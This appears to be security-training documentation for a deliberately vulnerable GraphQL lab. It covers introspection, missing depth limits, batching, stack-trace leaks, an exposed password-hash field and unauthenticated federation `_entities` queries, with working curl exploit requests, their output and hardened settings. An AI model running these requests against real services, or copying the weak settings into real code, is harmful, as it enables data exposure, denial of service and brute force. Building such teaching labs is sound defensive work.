# `GQL` — GraphQL itself

6 scenarios: `GQL-001` in `gateway`, `GQL-002` in `gateway`, `GQL-003` in `gateway`, `GQL-004` in `gateway`, `GQL-005` in `accounts`, `GQL-007` in `gateway`.

**In `accounts`.**

The scenario of the graph's own shape in `accounts`. Reproductions run against the accounts relay, `RELAY` (`http://127.0.0.1:4111` on the builder's port set; `3201` on the defaults).

**In `gateway`.**

**Family:** `GQL` · **Service:** `gateway` · **Surface:** GraphQL · **Scanner:** SAST, DAST · **OWASP:** A05, API3

The gateway serves one graph at `POST /graphql`, composed at start from the
three subgraphs. Four process-wide settings of that endpoint are weak on
purpose: a local sample that lives for minutes has no reason to switch the
developer conveniences off, and each is worth testing a scanner against. A
setting has no twin — the application cannot run both values at once — so each
entry records the hardened value instead of a counterpart. GQL-007 is a
deployment-level setting whose counterpart is shared with the subgraphs.

The reproductions were run on 2026-11-27 against the gateway alone on
`127.0.0.1:4400`, with stand-ins for the three subgraphs. `$A` is Alice's
token.

## GQL-001 — introspection and the GraphiQL IDE, served to anyone

### GQL-001 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `introspection: true`, `graphiql: true` in the factory.
- **Operation:** `POST /graphql` (introspection), `GET /graphql` with `Accept: text/html` (the IDE).
- **Sink:** the Apollo server's schema reporting and landing page.
- **Flow:** any caller, no credential, reads `__schema`; any browser gets the IDE.
- **Counterparts:** none — a process-wide setting. Hardened value: both `false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts`.
- **Expected finding:** CWE-200 on the module factory. A report on the safe endpoints of the same service for this CWE is a false positive.

### GQL-001 — student guide

Introspection is how a client learns the whole schema: every type, every
field, every argument. In production it is usually switched off, because it
hands an attacker the complete map of the API — here the map of all three
services composed into one graph. The GraphiQL IDE goes further: a page that
runs queries from the browser, served by the endpoint itself, so the attacker
does not even need a client installed. Both are one line each in the module
factory.

### GQL-001 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -d '{"query":"{ __schema { types { name } } }"}'
{"data":{"__schema":{"types":[{"name":"Announcement"},{"name":"ID"},{"name":"String"},{"name":"Decimal"},{"name":"Market"},{"name":"Order"},{"name":"Query"},{"name":"User"},…

$ curl -s http://127.0.0.1:4400/graphql -H 'accept: text/html'
…
    <title>GraphiQL</title>
…
```

The observation that proves exploitation: the whole composed graph — the types
of `accounts`, `trading` and `notifications` at once — is returned to a caller
who sent no credential at all, and the second answer is the IDE itself, ready
to run queries. In Postman: `POST {{gatewayUrl}}/graphql` with the
introspection query, then `GET {{gatewayUrl}}/graphql` with `Accept:
text/html`. In Burp: the same two requests, issued in sequence on the graph
endpoint.

### GQL-001 — vulnerable and protected

A process-wide setting has no twin: the same process cannot serve introspection
and refuse it. The hardened value is recorded here and in the catalogue entry:
`introspection: false` and `graphiql: false`. With both off, `__schema` is
answered with `GRAPHQL_VALIDATION_FAILED`, and `GET /graphql` with
`Accept: text/html` no longer serves the IDE.

### GQL-001 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test posts `__schema {
types { name } }` with no token and asserts the types of all three services
come back; one sends `GET /graphql` with `Accept: text/html` and asserts the
GraphiQL page is served. Both assert the exploit; there is no counterpart test
for a setting.

## GQL-002 — no depth or complexity limit

### GQL-002 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — no `validationRules` in the factory (marked by its absence).
- **Operation:** `POST /graphql`.
- **Sink:** the query planner: a document of any depth is planned and executed.
- **Flow:** `me { orders { user { orders { user { … } } } } }`, nested past any limit, is answered with data.
- **Counterparts:** none. Hardened value: a depth rule with a limit of 5.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts`.
- **Expected finding:** CWE-770 on the module factory.

### GQL-002 — student guide

A GraphQL server runs what the document asks for. Without a validation rule
that measures depth or complexity, one small document can make the server walk
a cycle of entities again and again: each `orders` asks `trading`, each `user`
asks `accounts` through `_entities`, and the product of the two is work that
grows exponentially with the depth of one request. The fix is a limit in
`validationRules` — the gateway ships none.

### GQL-002 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d @gql002.json
{"data":{"me":{"displayName":"Alice","orders":[{"id":"1","user":{"id":"u-alice","orders":[{"id":"1","user":{"id":"u-alice","orders":[…
```

`gql002.json` is `{"query": "…"}` with a document nested twelve deep
(`me { displayName orders { id user { id …` repeated, 315 bytes; every user of
the seed has two orders, so twelve levels is already a walk of thousands of
entities — deeper walks fan out exponentially). The observation that proves
exploitation: the answer is data, not a refusal, at a depth no operator would
allow (the hardened value is five).

### GQL-002 — vulnerable and protected

No twin: the limit is a validation rule the whole endpoint either carries or
does not. Hardened value: `validationRules: [depthLimit(5)]` (or an equivalent
rule) in the factory. With it, the document above is refused with
`GRAPHQL_VALIDATION_FAILED` before anything is planned.

### GQL-002 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test builds the document
twelve deep and asserts data comes back at every level, with `u-alice` resolved
at the deepest. The depth of the built document is twelve rather than the
specification's twenty-five because the seed's two orders per user make a
twenty-five-deep walk exhaust the test worker's heap — the flaw, the absence of
a limit, is the same at twelve.

## GQL-003 — batched requests: many operations in one call

### GQL-003 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `allowBatchedHttpRequests: true` in the factory.
- **Operation:** `POST /graphql` with a JSON array of operation objects.
- **Sink:** the Apollo server's HTTP handling: an array is answered as an array.
- **Flow:** three (or three thousand) operations cross as one request, each executed.
- **Counterparts:** none. Hardened value: `allowBatchedHttpRequests: false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts`.
- **Expected finding:** CWE-307 on the module factory.

### GQL-003 — student guide

Batching is a convenience for clients that can group their reads. It is also
the shape a brute force wants: the rate limit that counts requests sees one,
and the endpoint runs as many operations as the array holds. Ten guesses a
minute becomes ten thousand, because they all fit in a single HTTP request.

### GQL-003 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -d '[{"query":"{ __typename }"},{"query":"{ __typename }"},{"query":"{ __typename }"}]'
[{"data":{"__typename":"Query"}}
,{"data":{"__typename":"Query"}}
,{"data":{"__typename":"Query"}}]
```

The observation that proves exploitation: the answer is an array with one entry
per operation — three queries ran for one request. The same array with a
mutation repeated would be a brute force in one call.

### GQL-003 — vulnerable and protected

No twin: batching is on or off for the whole endpoint. Hardened value:
`allowBatchedHttpRequests: false`. With it, the array is refused before any
operation runs.

### GQL-003 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test posts an array of three
different operations and asserts the answer is an array of three, each with its
own data.

## GQL-004 — a stack trace in every error

### GQL-004 — agent reference

- **Source:** `apps/gateway/src/graphql/graphql.module.ts` — `includeStacktraceInErrorResponses: true` in the factory.
- **Operation:** `POST /graphql` with any invalid document.
- **Sink:** the error formatter: `extensions.stacktrace` reaches the client.
- **Flow:** a validation error answers the server's own frames and file paths.
- **Counterparts:** none. Hardened value: `includeStacktraceInErrorResponses: false`.
- **Tests:** `apps/gateway/test/scenarios/gql.int-spec.ts`.
- **Expected finding:** CWE-209 on the module factory.

### GQL-004 — student guide

Apollo includes the stack trace whenever `NODE_ENV` is not `production` —
which is every run of this lab — and the setting makes it explicit. The stack
tells an attacker what the process runs on, which library versions, and where
in the code an error landed: the frames carry the paths of the very files that
implement the endpoint. It is the GraphQL twin of an unhandled error page, and
it is answered to whoever sends a bad query.

### GQL-004 — exploit lab

```console
$ curl -s http://127.0.0.1:4400/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $A" -d '{"query":"{ me { nope } }"}'
{"errors":[{"message":"Cannot query field \"nope\" on type \"User\".","locations":[{"line":1,"column":8}],"extensions":{"code":"GRAPHQL_VALIDATION_FAILED","stacktrace":["GraphQLError: Cannot query field \"nope\" on type \"User\".","    at Object.Field (/…/graphql/validation/rules/FieldsOnCorrectTypeRule.js:84:13)",…
```

The observation that proves exploitation: `extensions.stacktrace` is an array
of the server's own frames, file paths of the machine included, in the answer
to a caller who asked for a field that does not exist.

### GQL-004 — vulnerable and protected

No twin. Hardened value: `includeStacktraceInErrorResponses: false`. With it,
the same error answers its message, location and code, and nothing of the
process. (The lab's `formatError` keeps whatever extensions the server put on
the error; that is deliberate and is this scenario.)

### GQL-004 — tests

`apps/gateway/test/scenarios/gql.int-spec.ts`: one test sends `{ me { nope } }`
and asserts `extensions.stacktrace` is an array of frames containing `at`
lines. Apollo answers a validation failure with status 400; the stack is in
the body either way.

## GQL-005 — the password hash is a field of the record

### GQL-005 — agent reference

| | |
| --- | --- |
| Operation | GraphQL `whoAmI: UserRecord` |
| Sink | `passwordHash` is a `@Field` of the `UserRecord` type, in `apps/accounts/src/legacy/whoami.resolver.ts` |
| Flow | any token → `whoAmI` → the stored hash is selected and returned |
| Counterparts | `apps/accounts/src/auth/auth.resolver.ts` (`me`: `User` has no such field), `apps/accounts/src/users/users.resolver.ts` (`user(id)`: admin only, and its `User` has no such field either) |
| Tests | `apps/accounts/test/scenarios/auth.int-spec.ts` |
| Expected finding | Yes, CWE-200, SAST |

### GQL-005 — student guide

The graph's `User` type has no hash field, so no selection of `me` or `user` can ask for one: the schema refuses the query before it runs. The legacy record type added the hash as a field for the old client, and every caller of `whoAmI` can select it.

### GQL-005 — exploit lab

```console
$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ whoAmI { id passwordHash } }"}'
{"data":{"whoAmI":{"id":"u-alice","passwordHash":"scrypt$16384$8$1$23fd6b1132f80ec3…"}}}

$ curl -s $RELAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $TOKEN" \
    -d '{"query":"{ me { passwordHash } }"}'
{"errors":[{"message":"Cannot query field \"passwordHash\" on type \"User\".",
  "extensions":{"code":"GRAPHQL_VALIDATION_FAILED"}}]}
```

`$TOKEN` is any token the caller holds — the field is there for whoever asks. `user(id: "u-alice") { passwordHash }` as an administrator fails the same way: no such field on `User`; as a user it is refused first (`FORBIDDEN`).

### GQL-005 — vulnerable and protected

| | Why |
| --- | --- |
| `whoAmI` (vulnerable) | `UserRecord` exposes the stored hash as a selectable field |
| `me` (protected) | `User` carries no hash field: the selection is a validation error before any resolver runs |
| `user(id)` (protected) | An administrator's operation, and still no hash field to select |

### GQL-005 — tests

`apps/accounts/test/scenarios/auth.int-spec.ts`, `GQL-005`: `whoAmI` returns the stored hash; `me { passwordHash }` and `user(id) { passwordHash }` are `GRAPHQL_VALIDATION_FAILED`; `user(id)` as a user is `FORBIDDEN`.

## GQL-007 — the federation queries of the backend services answer any caller

### GQL-007 — agent reference

- **Source:** `apps/accounts/src/graphql/graphql.module.ts`. Apollo adds `_service` and `_entities` to a subgraph's schema itself, outside the resolvers Nest's global guard runs for, and nothing in accounts asks for a credential on them. The module of `notifications` carries the same weak setting.
- **Operation:** `POST /graphql` on a subgraph's own port — `_service`, `_entities`.
- **Sink:** the federation resolvers: `_entities` resolves any entity by key, to any caller.
- **Flow:** a direct `_entities` call to accounts with no credential reads any user by key, though `user(id)` on the same service is an administrator's question.
- **Counterparts:** `apps/gateway/src/graphql/subgraph-data.source.ts` — the gateway presents `x-internal-token` on every subgraph fetch, composition included. `apps/trading/src/graphql/graphql.module.ts` — it registers `federation-queries.plugin.ts` beside it, which answers the two queries only to that token and refuses any other caller with 403 before a resolver runs.
- **Hardened value:** a subgraph requires `x-internal-token` on `_entities` and `_service`.
- **Tests:** `tests/e2e/scenarios-graphql.e2e-spec.ts` (the lab), `apps/trading/test/federation-queries.int-spec.ts` (the hardened subgraph alone), `apps/gateway/test/scenarios/gql.int-spec.ts` (the gateway against stand-ins).
- **Expected finding:** CWE-306 on accounts' GraphQL module. The gateway's data source and trading's module, which registers the plugin, are the controls: a report on them for this CWE is a false positive.

### GQL-007 — student guide

Federation needs two queries that no client should ever send directly:
`_service { sdl }` hands out the subgraph's whole schema, and `_entities`
resolves any entity by its key — the administrator's user record included —
without the field-level checks the graph's own fields carry. The gateway is
the only intended caller, and it proves itself with `x-internal-token` on
every fetch it makes.

The two queries are easy to leave open. Apollo adds them to a subgraph's
schema after the framework's own resolvers are registered, so the guard that
protects every other root field never runs for them: the same request that
`_entities` answers with data is refused by `user(id)`. Closing it is two
halves, and the lab shows both in place in one subgraph and neither in the
other two: the gateway presents the token, trading requires it on the two
federation queries, and accounts and notifications do not — there, anyone
who can reach the port sends the queries.

### GQL-007 — exploit lab

Run on 2026-11-28 against the whole lab, started by `pnpm start` on the port
set below. `accounts` and `trading` speak HTTP/2 in cleartext, which curl
cannot send, so they are reached through their relays, which change nothing in
a request ([ADR-012](../../.zazz/architecture/decisions/ADR-012-http1-relay-in-front-of-http2-services.md));
`notifications` speaks HTTP/1.1 on its own listener. On the defaults the
addresses are `3000`, `3201`, `3202` and `3103`.

```console
$ GATEWAY=http://127.0.0.1:4400
$ ACCOUNTS=http://127.0.0.1:4411
$ TRADING=http://127.0.0.1:4412
$ NOTIFICATIONS=http://127.0.0.1:4403
```

The flaw, in accounts — the administrator's record by key, with no credential:

```console
$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"User\", id: \"u-admin\"}]) { ... on User { id email displayName } } }"}'
{"data":{"_entities":[{"id":"u-admin","email":"admin@vcx.exchange","displayName":"Admin"}]}}

$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ user(id: \"u-admin\") { id email } }"}'
{"errors":[{"message":"Authentication required","path":["user"],"locations":[…],"extensions":{"code":"UNAUTHENTICATED",…}}],"data":{"user":null}}

$ curl -s $ACCOUNTS/graphql -H 'content-type: application/json' -d '{"query":"{ _service { sdl } }"}' | head -c 100
{"data":{"_service":{"sdl":"extend schema @link(url: \"https://specs.apollo.dev/federation/v2.14",
```

The same weak setting in notifications — an entity by key, with no credential:

```console
$ curl -s $NOTIFICATIONS/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"Announcement\", id: \"1\"}]) { ... on Announcement { id title } } }"}'
{"data":{"_entities":[{"id":"1","title":"Welcome to VCX"}]}}
```

The same two queries in trading, which requires the token:

```console
$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _service { sdl } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403

$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' \
    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id userId symbol } } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403
```

A session token says who the caller is; it does not say the caller is the
gateway. The two tokens are obtained through the gateway, as any client would:

```console
$ A=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"alice@vcx.exchange\", password: \"alice-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)

$ curl -s -w '\n%{http_code}\n' $TRADING/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ _entities(representations: [{__typename: \"Order\", id: \"1\"}]) { ... on Order { id } } }"}'
{"errors":[{"message":"trading answers its federation queries to the gateway only","extensions":{"code":"FORBIDDEN",…}}]}

403
```

And the gateway, which presents the token on every fetch, is answered. Each
of these joins is an `_entities` call — the first to accounts, the second to
trading:

```console
$ B=$(curl -s $GATEWAY/graphql -H 'content-type: application/json' \
    -d '{"query":"mutation { signIn(email: \"admin@vcx.exchange\", password: \"admin-lab-only\") { accessToken } }"}' | jq -r .data.signIn.accessToken)

$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"{ orders { id symbol user { id email displayName } } }"}'
{"data":{"orders":[{"id":"1","symbol":"BTC-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}},{"id":"6","symbol":"SOL-USD","user":{"id":"u-alice","email":"alice@vcx.exchange","displayName":"Alice"}}]}}

$ curl -s $GATEWAY/graphql -H 'content-type: application/json' -H "authorization: Bearer $B" \
    -d '{"query":"{ user(id: \"u-alice\") { id orders { id symbol } } }"}'
{"data":{"user":{"id":"u-alice","orders":[{"id":"1","symbol":"BTC-USD"},{"id":"6","symbol":"SOL-USD"}]}}}
```

Each error above also carries a stack, in `extensions.stacktrace`, and the
guard's error a copy of the underlying exception; these are left out here,
where `…` stands. The stack is the subject of GQL-004.

The observation that proves exploitation: the first call — `_entities` with
the representation `{__typename: "User", id: "u-admin"}` and no credential at
all — answers the administrator's own record, while the guarded field for the
same record refuses the same caller. The data the service protects is
reachable through the query it never checks. In Postman: `GQL-007 a direct
_entities call reads any user by key` in the gateway collection. In Burp: the
same requests, sent to the accounts relay's address.

### GQL-007 — vulnerable and protected

| | Why |
| --- | --- |
| `apps/accounts/src/graphql/graphql.module.ts` — vulnerable | `_service` and `_entities` are added to the schema by Apollo's `buildSubgraphSchema`, outside the handlers the global guard wraps. Nothing else asks, so the guard that refuses `user(id)` to the same caller is never consulted. The module of `notifications` is built the same way, and answers the same. |
| `apps/gateway/src/graphql/subgraph-data.source.ts` — protected | `willSendRequest` sets `x-internal-token` on every subgraph fetch, composition included, so a subgraph that asks for it is answered: the last two calls above. |
| `apps/trading/src/graphql/graphql.module.ts` — protected | It registers `federationQueriesNeedTheToken`. Once the operation is validated, and before any resolver, an operation that selects `_entities` or `_service` — at the root, under an alias, through a fragment — is refused with 403 unless the request's `x-internal-token` is the run's own. A session token is not it: that is why the call with `$A` is refused. |

The plugin's registration is the hardened value of the setting, in place in
one of the three subgraphs. The claim is scoped: this pattern closes the two
federation queries of trading to callers that are not the gateway, for the
identical request. It says nothing about any other field of trading, and
nothing about accounts or notifications.

### GQL-007 — tests

`tests/e2e/scenarios-graphql.e2e-spec.ts`, against the lab: one test sends
`_entities` to accounts' own listener with no credential and asserts
`u-admin`'s record comes back, then the same record through `user(id)`, refused;
one asserts notifications answers the two queries with no credential too; one
sends the two queries to trading and asserts 403, `FORBIDDEN` and no data; one
asserts a plain user's and an administrator's session token change nothing;
one asserts a call presenting the service token is answered and that the
gateway's joins still resolve, the one that is an `_entities` call to trading
among them; one asserts trading's ordinary operations answer as before; one
asserts the same refusal and the same answer through the relay.

`apps/trading/test/federation-queries.int-spec.ts`, the subgraph alone: the
three refusals — no credential, a session token, a query hidden under an
alias and a fragment — and the two answers, with the service token and for an
operation that is neither federation query. With the plugin's registration
removed from the module, its three refusal tests fail. The rest of trading's
suite calls `_entities` as the gateway does, presenting the service token.

`apps/gateway/test/scenarios/gql.int-spec.ts`: the gateway's half, against
stand-ins that play a subgraph either way — with the token required, the
direct call is refused 403 and the graph still answers.

## Scope of the counterparts

Each hardened value recorded here is scoped: it names the setting and what
that setting refuses for identical input. Nothing in this module says any
endpoint is secure in general.
